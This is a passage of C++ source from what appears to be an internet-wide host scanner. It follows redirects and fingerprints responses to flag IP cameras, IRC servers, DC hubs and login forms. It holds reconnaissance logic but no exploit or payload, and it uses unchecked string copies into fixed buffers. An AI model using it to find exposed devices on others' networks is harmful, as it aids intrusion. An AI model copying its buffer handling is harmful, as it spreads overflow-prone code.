            if (ls->_header(tempIP, tempPort, buffer.c_str(), ls, ps, redirStrLst) == -1)
			{
				ps->flag = -1;
                strcpy(ps->path, tempPath);

				return -1;
			};

            ps->port = tempPort;
		}
		else
		{
			ps->flag = -1;
			ls->flag = -1;
			if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) 
				+ "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" 
				+ "] Rejecting in _header::redirect [Dead host].");
		};
		
		return -2;
	}
	else if(strstr(str, "http://") != NULL) //http
	{
		tempPort = 80;
		char *ptr1 = strstri(str, "http://");
        char *ptr2 = _findFirst(ptr1 + 7, ":/?");

		if(ptr2 != NULL)
		{
			int sz = ptr2 - ptr1 - 7;
			ZeroMemory(tempIP, MAX_ADDR_LEN);
			strncpy(tempIP, ptr1 + 7, sz < 128 ? sz : 128);

			if(ptr2[0] == ':')
			{
				char *ptrPath = strstr(ptr2, "/");

				if(ptrPath != NULL)
				{
					sz = ptrPath - ptr2 - 1;

					char *pPth = strstr(ptr1 + 7, "/");
					strcpy(tempPath, pPth);
				}
				else
				{
					strcpy(tempPath, "/");
					sz = ptr2 - ptr1 - 7;
				};

				char tPort[8] = {0};
				strncpy(tPort, ptr2 + 1, sz < 8 ? sz : 5);
				tempPort = atoi(tPort);
			}
			else if(ptr2[0] == '/')
			{
				strncpy(tempPath, ptr2, strlen(ptr2));
			}
			else if(ptr2[0] == '?')
			{
				strcpy(tempPath, "/");
				strncat(tempPath, ptr2, strlen(ptr2));
			}
			else
			{
				stt->doEmitionRedFoundData("[Redirect] Unknown protocol (" + QString(ip) + ":" + QString::number(port) + ")");
			};
		}
		else
		{
			ZeroMemory(tempIP, MAX_ADDR_LEN);
			strncpy(tempIP, ptr1 + 7, strlen(str) - 7);
			strcpy(tempPath, "/");
		};

        std::unique_ptr<char[]> nip(new char[strlen(tempIP) + strlen(tempPath) + 1]);
        sprintf(nip.get(), "%s%s", tempIP, tempPath);
        std::string buffer;
        int cSz = Connector::nConnect(nip.get(), tempPort, &buffer);

        if(cSz > -1)
        {
            strcpy(ps->codepage, GetCodePage(buffer.c_str()));

            ls->flag = ContentFilter(buffer.c_str(), tempPort, tempIP, ps->codepage);
			ps->flag = ls->flag;

			if(ls->flag == -1) 
			{
				ps->flag = -1;
                strcpy(ps->path, tempPath);

				return -1;
			};

			if(ls->flag >= 17 || ls->flag == 11 || ls->flag == 12 
				|| ls->flag == 13 || ls->flag == 14 || ls->flag == 1 || ls->flag == 10) 
			{
                strcat(ps->headr, GetTitle(buffer.c_str()));
				ps->flag = ls->flag;
                strcpy(ps->path, tempPath);
				ps->port = tempPort;
				strcpy(ps->ip, tempIP);

				return -2;
			};

			if(ls->flag == 6)
			{
				ps->flag = ls->flag;
				ps->port = tempPort;
				return -2;			
			};

			strcat(ps->headr, " -> ");
            strcat(ps->headr, GetTitle(buffer.c_str()));

            if (ls->_header(tempIP, tempPort, buffer.c_str(), ls, ps, redirStrLst) == -1)
			{
				ps->flag = -1;
                strcpy(ps->path, tempPath);

				return -1;
			};
			ps->port = tempPort;
		}
		else
		{
			ps->flag = -1;
			ls->flag = -1;
			if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + 
				"/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + 
				"] Rejecting in _header::redirect [Dead host].");
		};

		return -2;
	}
	else if(str[0] == '/' || (str[0] == '.' && str[1] == '/') || (str[0] == '.' && str[1] == '.' && str[2] == '/'))
	{
		if(str[0] == '.' && str[1] == '.') strcpy(tempPath, str + 2);
		else if(str[0] == '.') strcpy(tempPath, str + 1);
		else strcpy(tempPath, str);

        std::unique_ptr<char[]> nip(new char[strlen(tempIP) + strlen(tempPath) + 1]);
        sprintf(nip.get(), "%s%s", tempIP, tempPath);
        std::string buffer;
        int cSz = Connector::nConnect(nip.get(), tempPort, &buffer);

        if(cSz > -1)
        {
            strcpy(ps->codepage, GetCodePage(buffer.c_str()));

            ls->flag = ContentFilter(buffer.c_str(), port, ip, ps->codepage);
			ps->flag = ls->flag;

			if(ls->flag == -1) 
			{
				ps->flag = -1;
                strcpy(ps->path, tempPath);

				return -2;
			};

			if(ls->flag >= 17 || ls->flag == 11 || ls->flag == 12 
				|| ls->flag == 13 || ls->flag == 14 || ls->flag == 1 || ls->flag == 10) 
			{
                strcat(ps->headr, GetTitle(buffer.c_str()));
				ps->flag = ls->flag;
                strcpy(ps->path, tempPath);
				ps->port = port;
				strcpy(ps->ip, ip);

				return -2;
			};
			if(ls->flag == 6)
			{
				ps->flag = ls->flag;
				ps->port = tempPort;
				return -2;			
			};

			strcat(ps->headr, "->");
            strcat(ps->headr, GetTitle(buffer.c_str()));

            if (ls->_header(tempIP, tempPort, buffer.c_str(), ls, ps, redirStrLst) == -1)
			{
				ps->flag = -1;
                strcpy(ps->path, tempPath);

				return -1;
			};
			ps->port = tempPort;
		}
		else
		{
			ps->flag = -1;
			ls->flag = -1;
			if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + 
				"/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + 
				"] Rejecting in _header::redirect [Dead host].");
		};
		return -2;
	}
	else if(strlen(str) > 2)
    {
        std::unique_ptr<char[]> nip(new char[strlen(ip) + strlen(str) + 1]);
        sprintf(nip.get(), "%s%s", ip, str);
        std::string buffer;
        int cSz = Connector::nConnect(nip.get(), port, &buffer);

        if(cSz > -1)
        {
            strcpy(ps->codepage, GetCodePage(buffer.c_str()));

            ls->flag = ContentFilter(buffer.c_str(), port, ip, ps->codepage);
			ps->flag = ls->flag;

			if(ls->flag == -1) 
			{
				ps->flag = -1;
                strcpy(ps->path, tempPath);

				return -1;
			};

			if(ls->flag >= 17 || ls->flag == 11 || ls->flag == 12 
				|| ls->flag == 13 || ls->flag == 14 || ls->flag == 1 || ls->flag == 10) 
			{
                strcat(ps->headr, GetTitle(buffer.c_str()));
				ps->flag = ls->flag;
                strcpy(ps->path, tempPath);
				ps->port = port;
				strcpy(ps->ip, ip);

				return -2;
			};

            if(ls->flag == 6)
            {
                ps->flag = ls->flag;
                ps->port = tempPort;
                return -2;
            };

			strcat(ps->headr, " -> ");
            strcat(ps->headr, GetTitle(buffer.c_str()));
            ls->_header(ip, port, buffer.c_str(), ls, ps, redirStrLst);
			ps->port = tempPort;
		}
		else
		{
			ps->flag = -1;
			ls->flag = -1;
			if(gNegDebugMode) stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + 
				"/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + 
				"] Rejecting in _header::redirect [Dead host].");
		};
		return -2;
	};
		
	return -1;
}

void _getPopupTitle(PathStr *ps, char *str)
{
	strcat(ps->headr, "[Popup detected. Title: "); 				

	char *ptr1 = strstr(str, ",");
	if(ptr1 != NULL)
	{
		char *ptr2 = strstr(ptr1 + 1, ",");
		if(ptr2 != NULL)
		{
			int sz = ptr2 - ptr1 - 1;
			if(sz >= 32) sz = 32;
			
			strncat(ps->headr, ptr1 + 1, sz < 32 ? sz : 32);
		}
		else
		{
			strcat(ps->headr, "[BOUNDARY ERROR]");
		};
	}
	else
	{
		char temp[32] = {0};
		if(strstr(str, "(") != NULL){
			strncpy(temp, strstr(str, "("), 32);
			strcat(ps->headr, temp);
		} else {
			strcat(ps->headr, "[No title]");
		};
	};

	strcat(ps->headr, "]"); 
}

void _getLinkFromJSLocation(char *dataBuff, char *str, char *tag, char *ip, int port)
{
	char *ptr1 = strstr(str, tag);
	if(ptr1 != NULL)
	{
		char *ptr2 = _findFirst(ptr1, "=(");
		char *ptrSemi = _findFirst(ptr1 + strlen(tag), ".;");
		if(ptrSemi == NULL)
		{
			ptrSemi = _findLast(ptr1 + strlen(tag) + 1, "'\"");
		}
		if(ptr2 != NULL && ptrSemi != NULL)
		{
			int sz = ptrSemi - ptr2;
			if(sz >= 2)
			{
				char *ptrQuote1 = _findFirst(ptr2, "\"'");
				if(ptrQuote1 != NULL)
				{
					char *ptrQuoteTemp = _findFirst(ptrQuote1 + 1, ";\n}");
					if(ptrQuoteTemp != NULL)
					{
						sz = ptrQuoteTemp - ptrQuote1 + 1;
					}
					else
					{
						ptrQuoteTemp = _findFirst(ptrQuote1 + 1, "\"'");
						sz = ptrQuoteTemp - ptrQuote1 + 1;
					}
					char *tempBuff = new char[sz + 1];
                    ZeroMemory(tempBuff, sizeof(*tempBuff));
					strncpy(tempBuff, ptrQuote1 + 1, sz);
					memset(tempBuff + sz, 0, 1);
					char delim[2] = {0};
					ZeroMemory(delim, 1);
					delim[0] = ptrQuote1[0];
					delim[1] = '\0';

					char *ptrQuote2 = _findLast(tempBuff + 1, delim);
					if(ptrQuote2 != NULL)
					{
                        sz = ptrQuote2 - tempBuff;
						if(sz < 511)
						{
							if (tempBuff[0] == '.' && tempBuff[1] == '/')
							{
								strncat(dataBuff, tempBuff + 1, sz - 1);
							}
							else if(tempBuff[0] != '/' 
								&& strstri(tempBuff, "http://") == NULL 
								&& strstri(tempBuff, "https://") == NULL
								) 
							{
								strcpy(dataBuff, "/");
								strncat(dataBuff, tempBuff, sz);
							}
							else strncpy(dataBuff, tempBuff, sz);
						};
					};
					delete tempBuff;
				}
				else
				{
					ptrQuote1 = strstr(ptr2, "=");
					if(ptrQuote1 != NULL)
					{
						char *ptrQuote2 = _findFirst(ptr2, ";\n");
						if(ptrQuote2 != NULL)
						{
							int sz = ptrQuote2 - ptr2 - 1;
							char link1[512] = {0};
							strncpy(link1, ptr2 + 1, sz);
							char *ptrQuote3 = strstr(link1, "/");
							if(ptrQuote3 != NULL)
                            {
								strcpy(dataBuff, ptrQuote3);
							};
						};
					};
				};
			};
		}
		else
		{
			stt->doEmitionRedFoundData("[JSLocator] _findFirst failed [" + QString(ip) + ":" + QString::number(port) + "]");			
		};
	};
}

int Lexems::_header(char *ip, int port, const char str[], Lexems *l, PathStr *ps, std::vector<std::string> *redirStrLst)
{
	std::string redirectStr = "";

    strcpy(ps->codepage, GetCodePage(str));
    char finalstr[512] = {0};
	
	if(strstri(str, "notice auth :*** looking up your hostname...") 
		|| strstri(str, "451 * :You have not registered.")
		) 
	{ 
		strcpy(ps->headr, "[IRC server]"); 
		strcpy(ps->path, "/");  return 1; 
	};

	if((strstri(str, "ip camera") != NULL				|| strstr(str, "+tm01+") != NULL 
		|| strstri(str, "camera web server") != NULL	|| strstri(str, "ipcam_language") != NULL
		|| strstri(str, "/viewer/video.jpg") != NULL	|| strstri(str, "network camera") != NULL
		|| strstri(str, "sanpshot_icon") != NULL		|| strstri(str, "snapshot_icon") != NULL
		|| strstri(str, "lan camera") != NULL			|| strstri(str, "cgiuserlogin?") != NULL
		|| strstri(str, "web camera") != NULL			|| strstri(str, "smart ip device") != NULL
		|| strstri(str, "pan/tilt camera") != NULL		|| strstri(str, "/cgi-bin/viewer/getparam.cgi?") != NULL
		|| strstri(str, "IPCamera") != NULL)
		&& strstr(str, "customer") == NULL
		&& strstr(str, "purchase") == NULL
		&& strstr(str, "contac") == NULL
		&& strstr(str, "company") == NULL
		) 
	{
		if (strstr(str, "CgiStart?page=Single") != NULL) {
			strcpy(ps->headr, "[IP Camera (Unibrowser)]");
		}
		else {
			strcpy(ps->headr, "[IP Camera]");
		}
		l->flag = 0;
		ps->flag = 0;
	};

	if(strstri(str, "get_status.cgi") != NULL)			strcpy(ps->headr, "[It may be ip camera]"); 
	if(strstri(str, "vo_logo.gif") != NULL 
		|| strstri(str, "vo logo.gif") != NULL
		)												strcpy(ps->headr, "[VIVOTEK camera detected?]"); 
	
	if(strstri(str, "$lock extended") != NULL) 
	{ 
		strcpy(ps->headr, "[DChub detected.]"); 
		strcpy(ps->path, "/");  
		return 0; 
	};
	if(strstri(str, "top.htm?currenttime") != NULL 
		|| strstri(str, "top.htm?") != NULL
		)												strcat(finalstr, " [?][SecCam detected]");

    if(strstri(str, "http-equiv=\"refresh\"") != NULL
        || strstri(str, "http-equiv=refresh") != NULL
        || strstri(str, "http-equiv='refresh'") != NULL
        )
    {
        char *temp = NULL;
        char *strTmp = NULL;

        if(strstri(str, "http-equiv=\"refresh\"") != NULL) strTmp = strstri(str, "http-equiv=\"refresh\"");
        else if(strstri(str, "http-equiv=refresh") != NULL) strTmp = strstri(str, "http-equiv=refresh");
        else if(strstri(str, "http-equiv='refresh'") != NULL) strTmp = strstri(str, "http-equiv='refresh'");

        if(strstri(strTmp, "url=") != NULL )
        {
            if((int)(strstri(strTmp, "url=") - strTmp) < 100)
            {
                temp = strstri(strTmp, "url=");

                char *temp2 = NULL, temp3[128] = {0};
                int sz = 0;

                if(temp[4] == '"' || temp[4] == '\'' || temp[4] == ' ' || temp[4] == '\n' || temp[4] == '\r')
                {
                    temp2 = _findFirst(temp + 6, " \n>\"'");
                    if(temp2 != NULL)
                    {
                        sz = (int)(temp2 - temp) - 5;
                        strncpy(temp3, (char*)(temp + 5), (sz < 128 ? sz : 127));
                    };
                }
                else
                {
                    temp2 = _findFirst(temp + 4, " \n>\"'");
                    if(temp2 != NULL)
                    {
                        sz = (int)(temp2 - temp) - 4;
                        strncpy(temp3, (char*)(temp + 4), sz < 128 ? sz : 127);
                    };
                };
                if(strstri(temp3, "http://") == NULL && strstri(temp3, "https://") == NULL)
                {
                    if(temp3[0] != '.')
                    {
                        if(temp3[0] != '/')
                        {
                            char temp4[128] = {0};
                            strcpy(temp4, "/");
                            strncat(temp4, temp3, 127);
                            strncpy(temp3, temp4, 128);
                        };
                    };
                };

                redirectStr = std::string(temp3);
                if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end())
                {
                    redirStrLst->push_back(redirectStr);
                    return redirectReconnect(ip, port, temp3, l, ps, redirStrLst);
                } return -1;
                strcat(ps->headr, " ");
                return -2;
            };

            strcat(ps->headr, finalstr);
            strcat(ps->headr, " ");
            return 0;
        };
    };

	if(strstri(str, "<script") != NULL)
    {
		char *ptr1 = strstri(str, "<script");
		char *ptr2 = NULL;
		char linkPtr[512] = {0};

		do
		{
			ZeroMemory(linkPtr, 512);
			ptr2 = strstri(ptr1, "</script>");
			if(ptr2 != NULL)
			{
				int sz = ptr2 - ptr1;
				char *scriptContainer = new char[sz + 1];
				ZeroMemory(scriptContainer, sz + 1);
				strncpy(scriptContainer, ptr1, sz);
				memset(scriptContainer + sz, '\0', 1);
				
				ZeroMemory(linkPtr, 512);
				if(strstri(scriptContainer, "location.href") != NULL)			_getLinkFromJSLocation(linkPtr, scriptContainer, "location.href", ip, port);
				else if(strstri(scriptContainer, "location.replace") != NULL)	_getLinkFromJSLocation(linkPtr, scriptContainer, "location.replace", ip, port);
				else if(strstri(scriptContainer, "location.reload") != NULL)	strcpy(linkPtr, "/");
				else if(strstri(scriptContainer, "location") != NULL)			_getLinkFromJSLocation(linkPtr, scriptContainer, "location", ip, port);
				
				if(strlen(linkPtr) != 0)
				{
					redirectStr = std::string(linkPtr);
					if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
					{
						redirStrLst->push_back(redirectStr);
                        redirectReconnect(ip, port, linkPtr, l, ps, redirStrLst);
					};
				};
				delete []scriptContainer;
				if(ps->flag >= 17 || ps->flag == 11 || ps->flag == 12 
				|| ps->flag == 13 || ps->flag == 14 || ps->flag == 1 
				|| ps->flag == 10
				) 
				return -2;
				else if(ps->flag == -1) return -1;
			}
			else
			{
				strcat(ps->headr, "[Cannot retrieve \"<script>\"-block]"); 
				strcat(ps->headr, " ");
				break;
			};
			ptr1 = strstri(ptr2, "<script");
		}
		while(ptr1 != NULL);
	}
	
	if(strstri(str, " onload") != NULL)
	{
		char *ptr1 = strstri(str, " onload");
		char *ptr2 = strstr(ptr1, ">");
		if(ptr2 != NULL)
		{
			int sz = ptr2 - ptr1;
			if(sz < 512)
			{
				char linkPtr[512] = {0};
				ZeroMemory(linkPtr, 512);
				strncpy(linkPtr, ptr1, sz);
				char *scriptContainer = new char[sz + 1];
				ZeroMemory(scriptContainer, sz + 1);
				strncpy(scriptContainer, ptr1, sz);
				memset(scriptContainer + sz, '\0', 1);
				
				ZeroMemory(linkPtr, 512);
				if(strstri(scriptContainer, "location.href") != NULL)			_getLinkFromJSLocation(linkPtr, scriptContainer, "location.href", ip, port);
				else if(strstri(scriptContainer, "location.replace") != NULL)	_getLinkFromJSLocation(linkPtr, scriptContainer, "location.replace", ip, port);
				else if(strstri(scriptContainer, "location.reload") != NULL)	strcpy(linkPtr, "/");
				else if(strstri(scriptContainer, "location") != NULL)			_getLinkFromJSLocation(linkPtr, scriptContainer, "location", ip, port);
				
				if(strlen(linkPtr) != 0)
				{
					redirectStr = std::string(linkPtr);
					if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
					{
						redirStrLst->push_back(redirectStr);
                        return redirectReconnect(ip, port, linkPtr, l, ps, redirStrLst);
					} return -1;
				};
				delete []scriptContainer;
				if(ps->flag >= 17 || ps->flag == 11 || ps->flag == 12 
				|| ps->flag == 13 || ps->flag == 14 || ps->flag == 1 
				|| ps->flag == 10
				) 
				return -2;
				else if(ps->flag == -1) return -1;
			};
		};
	};

	if(strstri(str, "ActiveXObject") != NULL 
		|| strstri(str, ".cab") != NULL 
		|| strstri(str, "clsid:") != NULL
		)
	{
		strcat(ps->headr, "[ActiveX]");
	};

	if(strstri(str, "<applet") != NULL 
		&& strstri(str, ".jar") != NULL
		)
	{
		strcat(ps->headr, "[Java]");
	};
	if(strstri(str, "<script") != NULL)
	{
		strcat(ps->headr, "[Javascript]");
	};
	if(strstri(str, "<video") != NULL)
	{
		strcat(ps->headr, "[Video]");
	};
	
	if(strstri(str, "<frameset") != NULL || strstri(str, "<frame") != NULL || strstri(str, "<iframe") != NULL)
	{
		const char *str1 = str;
		char *str2 = NULL;
        char lol[128] = {0};
		int AreaLen = 0;
		do
		{
			if(strstri(str1, "<frameset") != NULL) str1 = strstri(str1, "<frameset");
			else if(strstri(str1, "<frame") != NULL) str1 = strstri(str1, "<frame");
			else if(strstri(str1, "<iframe") != NULL) str1 = strstri(str1, "<iframe");
			else break;

			if(strstri(str1, "src=\"") != NULL) 
			{
				str1 = strstri(str1, "src=\""); 
				AreaLen = 5;
			}
			else if(strstri(str1, "src='") != NULL) 
			{
				str1 = strstri(str1, "src='");
				AreaLen = 5;
			}
			else if(strstri(str1, "src = \"") != NULL)
			{
				str1 = strstri(str1, "src = \"");
				AreaLen = 7;
			}
			else if(strstri(str1, "src = '") != NULL) 
			{
				str1 = strstri(str1, "src = '");
				AreaLen = 7;
			}
			else if(strstri(str1, "src=") != NULL) 
			{
				str1 = strstri(str1, "src=");
				AreaLen = 4;
			}
			else if(strstri(str1, "src = ") != NULL) 
			{
				str1 = strstri(str1, "src = ");
				AreaLen = 6;
			}
			else 
			{
				str1 = NULL;
				AreaLen = 0;
			};

			if(str1 != NULL)
			{
				str2 = _findFirst(str1 + AreaLen, "'\">");
				if(str2 != NULL)
				{
					char script[128] = {0};
					int sz = (int)(str2 - str1) - AreaLen;
					if((int)(str2 - str1) < 128) strncpy(script, str1 + AreaLen, sz);
					if(strstri(script, "http://") == NULL && strstri(script, "https://") == NULL) 
					{
						strcpy(lol, "http://");
						strcat(lol, ip);
						strcat(lol, ":");
						strcat(lol, std::to_string(port).c_str());
						if(script[0] != '/') strcat(lol, "/");
						strcat(lol, script);
					}
					else strcpy(lol, script);

					int flag = 0;
					if(sz > 0) 
					{
						if(script[0] != '#')
						{
							redirectStr = std::string(lol);
							if(std::find(redirStrLst->begin(), redirStrLst->end(), redirectStr) == redirStrLst->end()) 
							{
								redirStrLst->push_back(redirectStr);
                                return redirectReconnect(ip, port, lol, l, ps, redirStrLst);
							};
						}
						else
						{
							strcat(ps->headr, "[Unknown frame: \"");
							strcat(ps->headr, script);
							strcat(ps->headr, "\"]");
						};
					}

					flag = ps->flag;
					if(flag == 1 || flag == 11 || flag == 12
						|| flag == 13 || flag == 14 || flag >= 17 || flag == 10)
					{
						return -2;
					}
					else if(ps->flag == -1) return -1;
				}
				else
				{
					stt->doEmitionRedFoundData("[FrameLocator] Corrupted tag. [" + QString(ip) +":" + QString::number(port) + "]");
				};
			};
		}
		while(str1 != NULL);
		return -2;
	};
	if (strstri(str, "<form ") != NULL)
	{
		strcat(ps->headr, "[Form]");
	}
	//if(strstri(str, "<form ") != NULL) 
	//{
	//	strcat(ps->headr, " [Login form detected]");
	//	char *ptr1 = strstri(str, "<form");
	//	char *ptr2 = strstri(ptr1, "action");
	//	if(ptr2 != NULL)
	//	{
	//		char *ptr3 = strstri(ptr2, "=");
	//		if(ptr3 != NULL)
	//		{
	//			char *ptr4 = NULL;
	//			char *ptrEnd = NULL;
	//			int sz = 0;
	//			char redirStr[512] = {0};
	//			if(ptr3[1] == ' ' || ptr3[1] == '"' || ptr3[1] == '\"')
	//			{
	//				ptr4 = _findFirst(ptr3, " \"'\n\r");
	//				if(ptr4 != NULL)
	//				{
	//					ptrEnd = _findFirst(ptr4 + 1, " \"'\n\r");
	//					if(ptrEnd != NULL)
	//					{
	//						sz = ptrEnd - ptr4 - 1;
	//						strncpy(redirStr, ptr4 + 1, sz < 512 ? sz : 512);
	//					};
	//				};
	//			}
	//			else 
	//			{
	//				ptrEnd = _findFirst(ptr3, " \"'\n\r");
	//				if(ptrEnd != NULL)
	//				{
	//					sz = ptrEnd - ptr3 - 1;
	//					strncpy(redirStr, ptr3 + 1, sz < 512 ? sz : 512);
	//				};
	//			};

	//			if (redirStr[0] != '#') {
	//				if (std::find(redirStrLst->begin(), redirStrLst->end(), redirStr) == redirStrLst->end())
	//				{
	//					redirStrLst->push_back(redirStr);
 //                       return redirectReconnect(ip, port, redirStr, l, ps, redirStrLst);
	//				} return -1;
	//			}
	//			return -2;
	//		};
	//	}
	//	else
	//	{
	//		strcat(ps->headr, " [Form action not found]");
	//	};
	//	return 0;
	//};
	
	if(strlen(ps->headr) == 0)
	{
		strcat(ps->headr, "[Empty title]");
		if(strstri(str, "<html") == NULL && strstri(str, "<!doctype html") == NULL) 
		{
			strcat(ps->headr, "[No html]"); 
		};
		if(strstri(str, "<body") == NULL) 
		{
			strcat(ps->headr, "[No body]");
		};

		const char *ptr1 = strstr(str, "\r\n\r\n");
		if( ptr1 != NULL) 
		{
			if (strlen(ptr1) - 4 >= 15)
			{
				strcat(ps->headr, " [Data: ");

				char *ptr2 = strstri(ptr1 + 4, "<body");
				if (ptr2 != NULL)
				{
					strncat(ps->headr, ptr2 + 5, 64);
				}
				else {
					ptr2 = strstri(ptr1 + 4, "<html");
					if (ptr2 != NULL)
					{
						strncat(ps->headr, strstri(ptr1, "<html") + 5, 64);
					}
					else strncat(ps->headr, ptr1 + 4, 64);
				};

				strcat(ps->headr, "]"); 
			}
			else
			{
				if(gNegDebugMode) 
				{
					stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + 
						"/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + 
						"] Rejecting in _header::Lowload_body (&lt;15b)");
				};

				++Filt;
				strcpy(ps->path, "/"); 
				return -1; 
			};
		}
		else
		{
			strcat(ps->headr, " [Data:");
			strncat(ps->headr, str, 128);
			strcat(ps->headr, "]"); 
		};
	};

	ps->flag = ContentFilter(str, port, ip, ps->codepage);

	if(strstri(str, "window.open(") != NULL)
	{
		_getPopupTitle(ps, strstri(str, "window.open("));
	};

	strcpy(ps->path, "/");
	return 0;
}
